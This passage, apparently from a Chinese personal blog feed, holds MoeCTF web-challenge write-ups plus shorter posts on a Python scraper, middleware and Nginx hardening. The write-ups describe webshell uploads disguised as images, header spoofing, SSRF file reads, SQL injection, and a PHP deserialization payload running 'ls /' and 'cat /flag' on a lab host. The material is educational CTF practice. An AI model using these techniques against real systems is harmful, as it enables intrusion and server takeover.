src="https://pic.imgdb.cn/item/66b9ef6bd9c307b7e913e1e3.png"></p><ol start="3"><li>访问页面，得到flag</li></ol><p><img src="https://pic.imgdb.cn/item/66b9ef9fd9c307b7e9140fff.png"></p><h3 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h3><p>打开之后，是这样的，他提到要用爬虫，那么大概率就是要爬取网页的目录以及文件</p><p><img src="https://pic.imgdb.cn/item/66b9f0c7d9c307b7e9154be1.png"></p><p>那么我们就开始爬虫，我打算用burpsuite来进行，开启代理，burpsuie抓包</p><img src="https://pic.imgdb.cn/item/66b9f378d9c307b7e9184c26.png" style="zoom:67%;"><p>进行扫描</p><img src="https://pic.imgdb.cn/item/66b9f39ad9c307b7e9187878.png" style="zoom:67%;"><img src="https://pic.imgdb.cn/item/66b9f3c1d9c307b7e918a808.png" style="zoom: 67%;"><p>得到扫描结果，发现有一个robot.txt文件，访问看看</p><p><img src="https://pic.imgdb.cn/item/66b9f3f8d9c307b7e918ecfd.png"></p><p>他说只有robots才可以看web-tutor，那么就按照他说的来，改代理和disallow，在此界面抓包，放到重放器里，改完之后，发送</p><p><img src="https://pic.imgdb.cn/item/66b9f420d9c307b7e9191eb3.png"></p><p>那么现在就去刚刚看不了的东西里看看，答案出现</p><img src="https://pic.imgdb.cn/item/66b9f4ead9c307b7e91a0455.png" style="zoom: 50%;"><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h3><p>刚开始就提示你用post发请求了</p><p><img src="https://pic.imgdb.cn/item/66b9f55bd9c307b7e91a7c44.png"></p><p>但是还不知道请求参数，那么点击hit the question setter，出现参数，那么就来请求吧，这里我用的harkbar</p><p><img src="https://pic.imgdb.cn/item/66b9f604d9c307b7e91b3b77.png"></p><p>发起请求，这里不用参数，也可以只要是post方法就行</p><p><img src="https://pic.imgdb.cn/item/66b9f6aed9c307b7e91bf4b3.png"></p><p>下一步要求post参数了，按照他的来</p><p><img src="https://pic.imgdb.cn/item/66b9f70cd9c307b7e91c5eb8.png"></p><p>要求get参数</p><p><img src="https://pic.imgdb.cn/item/66b9f740d9c307b7e91c8ee8.png"></p><p>要求源来自于这个地址，那么标识源的就是refer参数，添加一个refer参数</p><p><img src="https://pic.imgdb.cn/item/66b9f794d9c307b7e91cda74.png"></p><p>要求cookie的值，添加一个cookie的值</p><p><img src="https://pic.imgdb.cn/item/66b9f7d7d9c307b7e91d2042.png"></p><p>要求使用这个浏览器，那么相当于要让此浏览器来作为代理，那么就改</p><p><img src="https://pic.imgdb.cn/item/66b9f823d9c307b7e91d743d.png"></p><p>这里要求只允许本地进入，其实就是配置X-Forwarded-For，将其配置为本地</p><p><img src="https://pic.imgdb.cn/item/66b9f8a4d9c307b7e91dff5a.png"></p><p>得到flag</p><h3 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h3><p>先看题目，300份，敏感的人已经大概率猜到应该是要用intruder</p><p><img src="https://pic.imgdb.cn/item/66b9f966d9c307b7e91f43bf.png"></p><p>打开环境是一个post表单，先填一填信息，直接burpsuite抓包</p><p><img src="https://pic.imgdb.cn/item/66b9f942d9c307b7e91ecd13.png"></p><p>抓到这个包，里面有我提交的信息，然后放到intruder里</p><p><img src="https://pic.imgdb.cn/item/66b9fa9cd9c307b7e922ac99.png"></p><p>直接攻击，这里给他发400份，防止意外</p><p><img src="https://pic.imgdb.cn/item/66b9fb31d9c307b7e924a471.png"></p><p>攻击之后，查看网页页面，flag出来了</p><p><img src="https://pic.imgdb.cn/item/66b9ff76d9c307b7e92c4689.png"></p><h3 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="headerlink" title="弗拉格之地的挑战"></a>弗拉格之地的挑战</h3><p><img src="https://pic.imgdb.cn/item/66ba1316d9c307b7e947e4d7.png"></p><p>按照步骤访问第一个页面 /flag1ab.html</p><p><img src="https://pic.imgdb.cn/item/66ba1339d9c307b7e9480a3f.png"></p><p>首先，一片空白不存在的，第一反应就是查看源代码</p><p><img src="https://pic.imgdb.cn/item/66ba138ad9c307b7e9485b4c.png"></p><p>按照步骤访问第二个页面 /flag2hh.php</p><p><img src="https://pic.imgdb.cn/item/66ba13ecd9c307b7e948c7a0.png"></p><p>他提到了http网络传输，那么就是看一下network的请求包和响应包，也是不出意外的在响应头中找到了信息</p><p><img src="https://pic.imgdb.cn/item/66ba14c2d9c307b7e949ac6f.png"></p><p>按照他给的提示，继续前往第三个页面 /flag3cad.php</p><p><img src="https://pic.imgdb.cn/item/66ba1530d9c307b7e94a192e.png"></p><p>这里多半就是要考传参了，直接用harkbar，一步到位</p><p><img src="https://pic.imgdb.cn/item/66ba1614d9c307b7e94ca04c.png"></p><p><img src="https://pic.imgdb.cn/item/66ba15e4d9c307b7e94be9ac.png"></p><p>继续前往下一关，哦吼，有坑，经过深思熟虑，他提到过来，那么就是来源，从哪来，那么尝试一波更改referer</p><p><img src="https://pic.imgdb.cn/item/66ba1697d9c307b7e94e8612.png"></p><p>搞起</p><p><img src="https://pic.imgdb.cn/item/66ba1718d9c307b7e94fe317.png"></p><p>直接进入下一个页面</p><p><img src="https://pic.imgdb.cn/item/66ba17bad9c307b7e9510650.png"></p><p>看到这个页面，按下开始后，让我按9，很明显没有9，但是我可以自己写一个9的按钮</p><img src="https://pic.imgdb.cn/item/66ba1825d9c307b7e951b6cc.png" style="zoom: 67%;"><p>这不就有了</p><p><img src="https://pic.imgdb.cn/item/66ba1850d9c307b7e95267d3.png"></p><p>还不给我flag,还需要一波操作</p><p><img src="https://pic.imgdb.cn/item/66ba1885d9c307b7e9533383.png"></p><p>console.log是控制台输出信息,那当然是去控制台查看了</p><p><img src="https://pic.imgdb.cn/item/66ba194bd9c307b7e956139b.png"></p><p>前往下一个页面 /flag5sxr.php</p><p><img src="https://pic.imgdb.cn/item/66ba1980d9c307b7e95648a8.png"></p><p>他让我输入,那就按照他输入,但是好像是不行的</p><p><img src="https://pic.imgdb.cn/item/66ba19d7d9c307b7e956aa8e.png"></p><p>查看一下源代码吧,源代码里有他的前端验证规则</p><p><img src="https://pic.imgdb.cn/item/66ba1a3cd9c307b7e9571486.png"></p><p>然后就发现,好像没什么用</p><p><img src="https://pic.imgdb.cn/item/66ba1addd9c307b7e957cda8.png"></p><p>或许,这才是关键,他说前端不靠谱,意思就是绕过前端检查吧,那我直接把的调用命令删了,是不是就可以了</p><p>来,开干!</p><p><img src="https://pic.imgdb.cn/item/66ba1b3dd9c307b7e9584022.png"></p><p>把onsubmit这个参数删了,然后再输入一次”我想要flag”(英文)</p><p><img src="https://pic.imgdb.cn/item/66ba1b90d9c307b7e958a4d2.png"></p><p>成功!!前往下一关!</p><p><img src="https://pic.imgdb.cn/item/66ba1bc4d9c307b7e958dd6c.png"></p><p>分析一下,存在一个get请求,存在一个post请求,如果get请求参数等于”/flag/“的时候就die,然后如果get请求参数等于”/flag/i”就出现flag,最大的问题就是匹配get的这个if语句先执行,即使输入/flag/i,也会被if语句匹配了,那么就永远执行不了elseif</p><p>根据php学习的知识,php是不区分大小写的,那不是就可以大小写直接绕过吗?</p><p>因为get和post都要,要用到harkbar,但是post没要求,随便给个值就可以</p><img src="https://pic.imgdb.cn/item/66ba1dfcd9c307b7e95b6110.png" style="zoom:67%;"><p>下一关!!!</p><p><img src="https://pic.imgdb.cn/item/66ba1e33d9c307b7e95b9df2.png"></p><p>熟悉的eval和POST,直接一个蚁剑拿下</p><img src="https://pic.imgdb.cn/item/66ba1ea9d9c307b7e95c2657.png" style="zoom: 50%;"><p>根目录下找到两个文件,一个flag,一个提示</p><p><img src="https://pic.imgdb.cn/item/66ba1efbd9c307b7e95c8d2d.png"></p><p>flag在此!</p><p><img src="https://pic.imgdb.cn/item/66ba1f29d9c307b7e95cbe5b.png"></p><p>提示文件:</p><p><img src="https://pic.imgdb.cn/item/66ba1f45d9c307b7e95ce0f6.png"></p><p>按照提示,把之前的所有flag按顺序拼在一起,一看,大小写还有等于号,妥妥base64编码,直接网上找一个base64解码平台,解开就有flag了</p><p>结束!七龙珠!</p><h2 id="第二、三周"><a href="#第二、三周" class="headerlink" title="第二、三周"></a>第二、三周</h2><h3 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h3><p><img src="https://pic.imgdb.cn/item/66c1fc64d9c307b7e9700049.png"></p><p>看题目要求，其实熟悉SSRF的人，一眼就知道这是一个SSRF漏洞，因为有一些关键词，’url’，’/etc/passwd’是linux系统中用户文件，’出不了网’，这一些都说明是在内网中，那么SSRF漏洞就可以让服务端去访问内网的网址，可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</p><p><img src="https://pic.imgdb.cn/item/66c1fd24d9c307b7e971d939.png"></p><p>这里需要上传一个url那么就直接来读文件吧</p><p><img src="https://pic.imgdb.cn/item/66c1fddfd9c307b7e973d087.png"></p><p>读出了文件，就找到了flag</p><p><img src="https://pic.imgdb.cn/item/66c1fe03d9c307b7e973ef8e.png"></p><h3 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a>ImageCloud</h3><img src="https://pic.imgdb.cn/item/66c230f2d9c307b7e9dd3944.png" style="zoom: 67%;"><p>依旧用刚才上传的php一句话木马实验一下</p><p><img src="https://pic.imgdb.cn/item/66c23120d9c307b7e9dd5d0a.png"></p><p>现在上传php后缀名就不可以了，那就换一个jpg上传试试，burpsuit抓包，更改文件后缀名php5、php3、phtml均被过滤了</p><h3 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h3><p><img src="https://pic.imgdb.cn/item/66c1fe6cd9c307b7e9746e04.png"></p><p>这题很简单，已经getshell，直接执行Linux系统代码试试（常见的服务器系统是Linux）</p><p><img src="https://pic.imgdb.cn/item/66c1febdd9c307b7e97574a9.png"></p><p>查看一下flag文件内容</p><p><img src="https://pic.imgdb.cn/item/66c1fee2d9c307b7e975b5fd.png"></p><p>看来是不在这个文件里的</p><p><img src="https://pic.imgdb.cn/item/66c20037d9c307b7e9795641.png"></p><p>也不在这里，经过我一番查看，一番折腾，寻找资料</p><p>才意识到他让我们看环境变量</p><p>$PATH、$HOME、$SHELL等那么多环境变量，去找哪一个呢？</p><p>最后经过一番查找，找到了两个查找环境变量的命令</p><ul><li>env </li><li>echo $FLAG（这个是FLAG作为了环境变量）</li></ul><p>终于找出来了！两个命令都可以查看flag</p><p><img src="https://pic.imgdb.cn/item/66c209eed9c307b7e991fcad.png"></p><p><img src="https://pic.imgdb.cn/item/66c20a05d9c307b7e9921135.png"></p><h3 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h3><p><img src="https://pic.imgdb.cn/item/66c20a96d9c307b7e992c38d.png"></p><p>看题目就是一个文件上传漏洞，上传一个php文件，里面包含一句话木马，然后用蚁剑连后门，直接控制系统，那么就开干！</p><p><img src="https://pic.imgdb.cn/item/66c20abdd9c307b7e9931e34.png"></p><p>他说上传图片，但是我还是想先直接上传一个php文件先试试</p><p><img src="https://pic.imgdb.cn/item/66c20b80d9c307b7e9953ae7.png"></p><p>所以说上传图片都是假的，他还没过滤我的php文件名后缀</p><p>那么直接用蚁剑连吧！</p><p><img src="https://pic.imgdb.cn/item/66c20c0dd9c307b7e996a3a5.png"></p><p>连接成功，进来寻找一波</p><p><img src="https://pic.imgdb.cn/item/66c20c4bd9c307b7e996da47.png"></p><p>熟悉的配方，和垫刀01一样的flag.sh，那么直接开一个虚拟终端，直接输入命令来查看</p><p><img src="https://pic.imgdb.cn/item/66c20dead9c307b7e99a7e55.png"></p><p><img src="https://pic.imgdb.cn/item/66c20e10d9c307b7e99ad124.png"></p><p>flag出现，结束！</p><h3 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h3><p><img src="https://pic.imgdb.cn/item/66c34b93d9c307b7e93995c4.png"></p><p>上传一个带一句话木马的jpg图片，然后在bp中将文件类型改为php，也就是绕过前端的js对后缀名的检查</p><p><img src="https://pic.imgdb.cn/item/66c34d97d9c307b7e93b94d9.png"></p><p><img src="https://pic.imgdb.cn/item/66c34dd8d9c307b7e93bd119.png"></p><p>已经保存到这个位置，用蚁剑直接连接试试</p><img src="https://pic.imgdb.cn/item/66c34db7d9c307b7e93bb589.png" style="zoom: 50%;"><p>连接成功，那就进去看看，然后之后的操作就和上面一样了，开一个虚拟终端，查看环境变量</p><p><img src="https://pic.imgdb.cn/item/66c34e53d9c307b7e93c6106.png"></p><h3 id="垫刀之路04-一个文件浏览器"><a href="#垫刀之路04-一个文件浏览器" class="headerlink" title="垫刀之路04: 一个文件浏览器"></a>垫刀之路04: 一个文件浏览器</h3><p><img src="https://pic.imgdb.cn/item/66c5fc0cd9c307b7e99566a8.png"></p><p>题目说在下面的文件里找flag，那么就开始吧</p><img src="https://pic.imgdb.cn/item/66c5fc24d9c307b7e99580f1.png" style="zoom: 67%;"><p>点开链接一个一个找，果然也是没用的，但是url弹出了一个path的参数，让我想到了ssrf，那么就来一试</p><img src="https://pic.imgdb.cn/item/66d0a45cd9c307b7e9811c41.png" style="zoom:50%;"><p>找到flag文件，但是打开没有flag，需要继续寻找</p><p><img src="https://pic.imgdb.cn/item/66d0a4fad9c307b7e981ac14.png"></p><p>最后在这个目录找到了</p><p><img src="https://pic.imgdb.cn/item/66d0a58cd9c307b7e9824018.png"></p><p>flag在此</p><p><img src="https://pic.imgdb.cn/item/66d0a5b4d9c307b7e98263d6.png"></p><h3 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h3><p><img src="https://pic.imgdb.cn/item/66c60073d9c307b7e9996ff6.png"></p><img src="https://pic.imgdb.cn/item/66c600a0d9c307b7e9999cb9.png" style="zoom:67%;"><p>第一反应就是，不信，我就要爆破，结果真的爆不出来，已老实，求放过</p><p>可能前面做题，harkbar用多了，下一反应就是用harkbar捣鼓一下，还是不行</p><p>最后想到了好久没用过的sql注入，哦吼，真就出来了</p><p><img src="https://pic.imgdb.cn/item/66c60311d9c307b7e9a0f4b7.png"></p><p>只能说，久违了SQL注入！</p><h3 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h3><img src="https://pic.imgdb.cn/item/66c60402d9c307b7e9a3a44f.png" style="zoom:67%;"><p>很典型的一个pop链，开干，分析代码，可执行指令eval，$s执行eval</p><p>传入data参数反序列化之后得到a，那么payload就应该将a序列化</p><p>类 A中有属性a，并且有一个__destruct()函数，是在对象销毁时调用，也可以说创建对象之后，不用了销毁之后调用，那么就创建一个对象</p><p>并且实例化一个对象后，a的值赋值给s，这意味着 $s变量所引用的值(也就是 this-&gt;a)将被作为一个函数或方法调用,并传入 this-&gt;evil作为参数</p><p>我们可以使用 system 函数来执行任意的系统命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new A();  </span><br><span class="line">$a-&gt;evil = "ls /";  </span><br><span class="line">$a-&gt;a = "system";</span><br></pre></td></tr></tbody></table></figure><p>那么构造payload</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:52682/?data=O:1:"A":2:{s:4:"evil";s:4:"ls /";s:1:"a";s:6:"system";}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66d0b8b0d9c307b7e99cd076.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:52682/?data=O:1:"A":2:{s:4:"evil";s:9:"cat /flag";s:1:"a";s:6:"system";}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66d0b8f8d9c307b7e99dab43.png">flag就出来了</p><h3 id="静态页面"><a href="#静态页面" class="headerlink" title="静态页面"></a>静态页面</h3><p><img src="https://pic.imgdb.cn/item/66c210ccd9c307b7e9a29c35.png"></p><p>好好好，什么都没有，查看了页面源代码，查看了检查，啥都没有</p><p>直接扔到burpsuit里进行扫描，看看有没有其他目录和文件，然后真就有</p><img src="https://pic.imgdb.cn/item/66c21130d9c307b7e9a3a954.png" style="zoom:50%;"><p>看到了flag的踪影，那就先访问一下这个页面吧</p><img src="https://pic.imgdb.cn/item/66c21167d9c307b7e9a41c1b.png" style="zoom:50%;"><p>让我直接访问这个php文件，照做就行</p><img src="https://pic.imgdb.cn/item/66c2119ad9c307b7e9a4a031.png" style="zoom:50%;"><p>有眉目了，继续继续，既要上传get又要上传post请求，那么harkbar直接上</p><p>isset就是存在，isnumeric就是是数字，a和b不能是数字，且（$a ==0&amp;&amp;md5($a)==$b[$a]）</p><p>$b[$a]：这个表达式访问数组 $b中索引为$a 的元素</p><p>这里绞尽脑汁了，还是有点困难，最后请教了一位大神</p><p><img src="https://pic.imgdb.cn/item/66c22dbad9c307b7e9daa844.png"></p><p>我们来看传入的a参数，首先会验证a是否是一个数字，不是数字才能通过，这里我们用到0%201，用0%20也行，%20在url编码中空格，用 0空格 就可以绕过数字的检查，然后进入到之后的条件$a == 0，这里==是弱比较，JavaScript 会将0空格字符串 ‘0 ‘ 转换为数字 0，然后比较 0 == 0，结果为 true，b的话只需要去网上找一个md5加密工具加密一下’0空格’就可以，最后得到flag</p><h3 id="电院-Backend"><a href="#电院-Backend" class="headerlink" title="电院_Backend"></a>电院_Backend</h3><h3 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="headerlink" title="勇闯铜人阵"></a>勇闯铜人阵</h3><h3 id="XDSEC-MessageBox"><a href="#XDSEC-MessageBox" class="headerlink" title="XDSEC_MessageBox"></a>XDSEC_MessageBox</h3>]]></content>
      
      
      <categories>
          
          <category> MoeCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>firewalld防火墙</title>
      <link href="/2024/08/06/firewalld-fang-huo-qiang/"/>
      <url>/2024/08/06/firewalld-fang-huo-qiang/</url>
      
        <content type="html"><![CDATA[<h1 id="firewalld防火墙"><a href="#firewalld防火墙" class="headerlink" title="firewalld防火墙"></a>firewalld防火墙</h1>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> firewalld防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫简单应用</title>
      <link href="/2024/08/05/python-pa-chong-jian-dan-ying-yong/"/>
      <url>/2024/08/05/python-pa-chong-jian-dan-ying-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="Python爬虫简单应用"><a href="#Python爬虫简单应用" class="headerlink" title="Python爬虫简单应用"></a>Python爬虫简单应用</h1><blockquote><p>首先需要Python两个第三方库，一个Requests，一个BeautifulSoup</p><p>下载很简单，前提是有pip，直接在终端输入pip install requests pip install bs4</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#导入第三方库</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">#这里的header是在有些网站不允许爬虫的情况下，通过伪造请求头，得到请求的方式，当然，别人不允许的东西，还是要听话，这里因为是我自己的个人博客也就无所谓了，哈哈</span><br><span class="line">header = {</span><br><span class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"</span><br><span class="line">}</span><br><span class="line">#用content来接收请求得到的内容,指定的网站是我自己的博客地址</span><br><span class="line">content = requests.get("https://www.xmhhmx.top",headers=header).text</span><br><span class="line">#将content传入BeautifulSoup的构造函数里面，返回一个对象赋值给soup</span><br><span class="line">#html.parser指定html解析器，说明是在解析html语句</span><br><span class="line">soup = BeautifulSoup(content,"html.parser")</span><br><span class="line">#根据元素属性提取：attrs</span><br><span class="line">#提取信息的特点就是都在span标签内并且class值都为card-title</span><br><span class="line">all_title = soup.findAll("span",attrs={"class":"card-title"})</span><br><span class="line">#遍历 .string：获取内容</span><br><span class="line">for title in all_title:</span><br><span class="line">    print(title.string)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>当然以上代码只能读取第一页的文章标题，因为个人在设计网站的原因，资源路径没设计好，第一个页面就是域名访问页面，而第2、3……页的资源路径为/page/2（3、……）</p><p>所以要想实现所有页面爬取就得分开处理</p></blockquote><p>代码实现，略显繁琐，单独处理第一页界面</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">header = {</span><br><span class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"</span><br><span class="line">}</span><br><span class="line">#第一页</span><br><span class="line">content = requests.get("https://www.xmhhmx.top",headers=header).text</span><br><span class="line">soup = BeautifulSoup(content,"html.parser")</span><br><span class="line">all_title = soup.findAll("span",attrs={"class":"card-title"})</span><br><span class="line">for title in all_title:</span><br><span class="line">    print(title.string)</span><br><span class="line">#第2页及以后</span><br><span class="line">for start_page in range(2,10):</span><br><span class="line">    content = requests.get(f"https://www.xmhhmx.top/page/{start_page}", headers=header).text</span><br><span class="line">    soup = BeautifulSoup(content, "html.parser")</span><br><span class="line">    all_title = soup.findAll("span", attrs={"class": "card-title"})</span><br><span class="line">    for title in all_title:</span><br><span class="line">        print(title.string)</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见的中间件</title>
      <link href="/2024/08/03/chang-jian-de-zhong-jian-jian/"/>
      <url>/2024/08/03/chang-jian-de-zhong-jian-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="常见的中间件"><a href="#常见的中间件" class="headerlink" title="常见的中间件"></a>常见的中间件</h1><h2 id="常见的中间件分类"><a href="#常见的中间件分类" class="headerlink" title="常见的中间件分类"></a><strong>常见的中间件分类</strong></h2><ol><li>消息队列中间件：用于在应用程序之间进行异步消息传递。消息队列中间件包括<strong>RabbitMQ</strong>、Apache Kafka、ActiveMQ等。</li><li>数据库中间件：用于管理和访问数据库。数据库中间件包括MySQL Proxy、PostgreSQL PgBouncer等。</li><li>缓存中间件：用于加速数据访问，减轻数据库负载。缓存中间件包括<strong>Redis</strong>、Memcached等。</li><li>Web服务器中间件：用于处理HTTP请求和响应。常见的Web服务器中间件包括<strong>Nginx</strong>、<strong>Apache</strong>等。</li><li>应用服务器中间件：用于托管和管理应用程序的执行环境。常见的应用服务器中间件包括<strong>Tomcat</strong>、Jboss等。</li><li>API网关中间件：用于管理和控制API的访问和调用。常见的API网关中间件包括Kong、Apigee等。</li></ol><h2 id="消息队列中间件"><a href="#消息队列中间件" class="headerlink" title="消息队列中间件"></a>消息队列中间件</h2><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx的安全加固</title>
      <link href="/2024/08/02/nginx-de-an-quan-jia-gu/"/>
      <url>/2024/08/02/nginx-de-an-quan-jia-gu/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx的安全加固"><a href="#Nginx的安全加固" class="headerlink" title="Nginx的安全加固"></a>Nginx的安全加固</h1><h2 id="（1）隐藏nginx版本信息，防止页面报错暴露nginx版本"><a href="#（1）隐藏nginx版本信息，防止页面报错暴露nginx版本" class="headerlink" title="（1）隐藏nginx版本信息，防止页面报错暴露nginx版本"></a><strong>（1）隐藏nginx版本信息，防止页面报错暴露nginx版本</strong></h2><p>在配置文件中加入</p><p>http {</p><p>  server_tokens off;</p><p>}</p><h2 id="（2）以专门的用户帐号和组运行nginx"><a href="#（2）以专门的用户帐号和组运行nginx" class="headerlink" title="（2）以专门的用户帐号和组运行nginx"></a><strong>（2）以专门的用户帐号和组运行nginx</strong></h2><p>根据需要为nginx创建用户、组</p><p>创建nginx组：groupadd nginx</p><p>创建nginx用户并加入nginx组：useradd nginx –g nginx</p><p>在配置文件中加入允许运行nginx服务器的用户和用户组</p><p><img src="https://pic.imgdb.cn/item/66ac983bd9c307b7e932c561.png"></p><h2 id="（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容"><a href="#（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容" class="headerlink" title="（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容"></a><strong>（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容</strong></h2><ul><li>1一般为/etc/nginx目录，默认情况下属主为root:root，其它用户不能修改文件，默认一般符合要求</li></ul><p><img src="https://pic.imgdb.cn/item/66ac9887d9c307b7e9330ee0.png"></p><ul><li>2严格设置配置文件和日志文件的权限，防止未授权访问。</li></ul><p>chmod 600 /etc/nginx/nginx.conf”设置配置文件为属主可读写，其他用户无权限</p><p>未改之前：所有用户均可读</p><p><img src="https://pic.imgdb.cn/item/66ac98abd9c307b7e933361a.png"></p><p>更改之后：</p><p><img src="https://pic.imgdb.cn/item/66ac98bed9c307b7e9334895.png"></p><ul><li>3使用命令”chmod 644 /var/log/nginx/*.log”设置日志文件为属主可读写，其他用户只读权限。</li></ul><p>未更改之前：所有人可读</p><p><img src="https://pic.imgdb.cn/item/66ac98ced9c307b7e9335694.png"></p><p>此情况是正常的，不能让除属主之外的人拥有更改权限</p><h2 id="（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的-IP-地址等内容"><a href="#（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的-IP-地址等内容" class="headerlink" title="（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的 IP 地址等内容"></a><strong>（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的 IP 地址等内容</strong></h2><p><img src="https://pic.imgdb.cn/item/66ac98e1d9c307b7e9336612.png"></p><p><img src="https://pic.imgdb.cn/item/66ac98efd9c307b7e9337308.png"></p><h2 id="（5）禁止访问外部文件"><a href="#（5）禁止访问外部文件" class="headerlink" title="（5）禁止访问外部文件"></a><strong>（5）禁止访问外部文件</strong></h2><p> 通过Nginx配置，禁止访问特定后缀的资源</p><p>location ~ .*.(rar|zip|gz|tar|7z|xz|bz2|bak)?$</p><p>{</p><p>  return 403;</p><p>}</p><h2 id="（6）错误信息重定向"><a href="#（6）错误信息重定向" class="headerlink" title="（6）错误信息重定向"></a><strong>（6）错误信息重定向</strong></h2><p><img src="https://pic.imgdb.cn/item/66ac98ffd9c307b7e933872e.png"></p><h2 id="（7）禁止目录列出：目录列出会导致明显信息泄露或下载"><a href="#（7）禁止目录列出：目录列出会导致明显信息泄露或下载" class="headerlink" title="（7）禁止目录列出：目录列出会导致明显信息泄露或下载"></a><strong>（7）禁止目录列出：目录列出会导致明显信息泄露或下载</strong></h2><p>在配置文件中http{}中如果autoindex on那么当访问目录没有访问页面时，会将这个目录的内容列出</p><p><img src="https://pic.imgdb.cn/item/66ac9911d9c307b7e9339a64.png"></p><p>所以要将antoindex关闭autoindex off，就可以保护信息不被泄露</p><p><img src="https://pic.imgdb.cn/item/66ac9923d9c307b7e933ac55.png"></p><p>不过，默认配置文件是不会写autoindex的，也就是默认就禁止目录列出了</p><h2 id="（8）拒绝服务防范：合理设置-session-时间，防止拒绝服务攻击"><a href="#（8）拒绝服务防范：合理设置-session-时间，防止拒绝服务攻击" class="headerlink" title="（8）拒绝服务防范：合理设置 session 时间，防止拒绝服务攻击"></a><strong>（8）拒绝服务防范：合理设置 session 时间，防止拒绝服务攻击</strong></h2><ul><li>1在http{}中写入session保持时间</li></ul><p><img src="https://pic.imgdb.cn/item/66ac9933d9c307b7e933b967.png"></p><ul><li>2设置客户端请求读取超时时间</li></ul><p>http {</p><p>  proxy_connect_timeout 10s;</p><p>  proxy_read_timeout 30s;</p><p>}</p><p>proxy_connect_timeout设置为10秒， 